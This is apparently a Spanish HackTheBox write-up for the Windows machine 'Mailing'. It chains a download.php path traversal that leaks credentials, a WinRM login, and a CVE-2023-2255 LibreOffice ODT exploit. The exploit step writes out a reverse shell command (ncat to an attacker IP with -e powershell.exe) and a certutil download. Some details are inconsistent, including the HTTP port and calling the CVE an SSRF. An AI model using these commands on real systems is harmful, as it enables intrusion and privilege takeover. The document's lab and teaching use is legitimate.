---
icon: windows
tags:
  - lfi
  - winrm
  - ssrf
  - cve-2023-2255
  - libreoffice
---

# Mailing

## Resumen

### Detalles

| Campo                 | Detalle       |
| --------------------- | ------------- |
| **Nombre**            | Mailing       |
| **Sistema Operativo** | Windows       |
| **Plataforma**        | HackTheBox    |
| **Fecha**             | 04/11/2026    |
| **IP Objetivo**       | 10.129.232.39 |

### Executive Summary

Máquina Windows de dificultad fácil que expone un servidor de correo **hMailServer** y un sitio IIS con un endpoint `download.php` vulnerable a **Path Traversal / LFI**. La enumeración inicial reveló los puertos de correo (25, 110, 143, 465, 587, 993), WinRM (5985) y el sitio web en el 80.

Aprovechando el path traversal en `download.php` se pudo leer un script de configuración de hMailServer (`EventHandlers.vbs`), que exponía en texto claro las credenciales del usuario `maya`. Con esas credenciales se accedió por **WinRM** usando `evil-winrm`, obteniendo así el primer acceso y la flag de usuario.

Para la escalada se identificó una instalación de **LibreOffice v7.4**, vulnerable a **CVE-2023-2255** (carga automatizada de enlaces externos en documentos ODT). Se comprobó que el directorio `C:/Important Documents` era escribible por `maya` y que su contenido se borraba periódicamente, lo que indicaba la existencia de un proceso o usuario interactuando con él. Se generó un documento ODT malicioso, se subió a dicha carpeta y, al ser abierto por el proceso automatizado, se ejecutó una reverse shell en el contexto de una cuenta privilegiada, obteniendo ejecución como **root** y la flag final.

### Técnicas

* LFI (Local File Inclusion)
* WinRM Authentication
* SSRF en LibreOffice Explotation (CVE-2023-2255)

## Information Gathering

### Port Scanning

#### TCP

```bash
> sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.232.39
> nmap -sCV -Pn -n -v -p25,80,110,135,139,143,445,465,587,993,5040,5985,7680,47001,49664,49665,49666,49667,49668,62944 10.129.232.39
```

```
PORT      STATE SERVICE       VERSION
25/tcp    open  smtp          hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://mailing.htb
110/tcp   open  pop3          hMailServer pop3d
|_pop3-capabilities: USER TOP UIDL
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp   open  imap          hMailServer imapd
|_imap-capabilities: RIGHTS=texkA0001 CHILDREN IMAP4rev1 IDLE ACL CAPABILITY completed SORT IMAP4 NAMESPACE OK QUOTA
445/tcp   open  microsoft-ds?
465/tcp   open  ssl/smtp      hMailServer smtpd
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU/Spain/countryName=EU
| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-02-27T18:24:10
| Not valid after:  2029-10-06T18:24:10
| MD5:   bd32:df3f:1d16:08b8:99d2:e39b:6467:297e
|_SHA-1: 5c3e:5265:c5bc:68ab:aaac:0d8f:ab8d:90b4:7895:a3d7
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|_ssl-date: TLS randomness does not represent time
587/tcp   open  smtp          hMailServer smtpd
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-02-27T18:24:10
| Not valid after:  2029-10-06T18:24:10
| MD5:   bd32:df3f:1d16:08b8:99d2:e39b:6467:297e
|_SHA-1: 5c3e:5265:c5bc:68ab:aaac:0d8f:ab8d:90b4:7895:a3d7
| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|_ssl-date: TLS randomness does not represent time
993/tcp   open  ssl/imap      hMailServer imapd
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-02-27T18:24:10
| Not valid after:  2029-10-06T18:24:10
| MD5:   bd32:df3f:1d16:08b8:99d2:e39b:6467:297e
|_SHA-1: 5c3e:5265:c5bc:68ab:aaac:0d8f:ab8d:90b4:7895:a3d7
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: RIGHTS=texkA0001 CHILDREN IMAP4rev1 IDLE ACL CAPABILITY completed SORT IMAP4 NAMESPACE OK QUOTA
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp  open  pando-pub?
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
62944/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-11-04T16:25:16
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

| Puerto    | Servicio      | Versión                                  |
| --------- | ------------- | ---------------------------------------- |
| 25/tcp    | smtp          | hMailServer smtpd                        |
| 80/tcp    | http          | Microsoft IIS httpd 10.0                 |
| 110/tcp   | pop3          | hMailServer pop3d                        |
| 135/tcp   | msrpc         | Microsoft Windows RPC                    |
| 139/tcp   | netbios-ssn   | Microsoft Windows netbios-ssn            |
| 143/tcp   | imap          | hMailServer imapd                        |
| 445/tcp   | microsoft-ds? |                                          |
| 465/tcp   | ssl\|smtp     | hMailServer smtpd                        |
| 587/tcp   | smtp          | hMailServer smtpd                        |
| 993/tcp   | ssl\|imap     | hMailServer imapd                        |
| 5040/tcp  | desconocido   |                                          |
| 5985/tcp  | http          | Microsoft HTTPAPI httpd 2.0 (SSDP\|UPnP) |
| 7680/tcp  | pando-pub?    |                                          |
| 47001/tcp | http          | Microsoft HTTPAPI httpd 2.0 (SSDP\|UPnP) |
| 49664/tcp | msrpc         | Microsoft Windows RPC                    |
| 49665/tcp | msrpc         | Microsoft Windows RPC                    |
| 49666/tcp | msrpc         | Microsoft Windows RPC                    |
| 49667/tcp | msrpc         | Microsoft Windows RPC                    |
| 49668/tcp | msrpc         | Microsoft Windows RPC                    |
| 62944/tcp | msrpc         | Microsoft Windows RPC                    |

## Explotación

### Foothold

* **Vulnerabilidad:** LFI (Local File Inclusion) + Information Leakage
* **Exploit:** Path Traversal en `download.php` mediante petición manual (`curl`) para leer `EventHandlers.vbs`
* **Procedimiento:**

1. Lectura de un script de hMailServer (`EventHandlers.vbs`)

&#x20;

<figure><img src="../../../.gitbook/assets/unknown (23).png" alt=""><figcaption></figcaption></figure>

El script exponía los credenciales del usuario `maya` (`m4y4ngs4ri`)

2. Conexión por WinRM con Evil-WinRM

```bash
> evil-winrm -i 10.129.232.39 -u 'maya' -p 'm4y4ngs4ri'
```

* **Evidencia:** (`user.txt`)

&#x20;

<figure><img src="../../../.gitbook/assets/unknown (24).png" alt="" width="410"><figcaption></figcaption></figure>

### Privesc

Se detectó que el sistema tenía instalada **LibreOffice v7.4**. Se encontraron las siguientes vulnerabilidades que afectaban a esa versión:

* **CVE-2023-0950**: ejecución remota de código mediante fórmulas de Calc.
* **CVE-2023-2255**: carga automatizada de enlaces externos.
* **CVE-2023-1183**: control externo de rutas de archivos.

Para la escalada de privilegios se explotó **CVE-2023-2255**, que permite la ejecución de comandos al abrir un documento ODT manipulado y requiere interacción del usuario. Se comprobó que el directorio `C:/Important Documents` estaba vacío y que el usuario `maya` tenía capacidad de escritura sobre él. Además, al introducir un archivo en dicha carpeta, este se borraba pasado un tiempo, lo que sugería que algún proceso o usuario revisaba y eliminaba los archivos.

* **Vulnerabilidad:** SSRF en LibreOffice v7.4 (CVE-2023-2255)
* **Exploit:** https://github.com/elweth-sec/CVE-2023-2255
* **Procedimiento:**

1. Se clona el repositorio del exploit, se ejecuta el script que compila el archivo `.odf` y se levanta un servidor http para descargarlo desde la máquina victima

```bash
> git clone https://github.com/elweth-sec/CVE-2023-2255
> python3 CVE-2023-2255.py --cmd "C:/Users/maya/Documents/ncat.exe 10.10.14.108 4444 -e powershell.exe"
> python3 -m http.server 9420
```

2. Se pone el puerto 4444 en escucha

```bash
> netcat -lvnp 4444
```

3. Se descarga el archivo en la máquina victima y se mueve al directorio `C:/Important Documents`

```powershell
> certutil -urlcache -f http://10.10.14.108:9402/output.odt output.odt
> mv output.odt "C:/Important Documents"
```

* **Evidencia:** (root.txt)

<figure><img src="../../../.gitbook/assets/unknown (25).png" alt="" width="563"><figcaption></figcaption></figure>
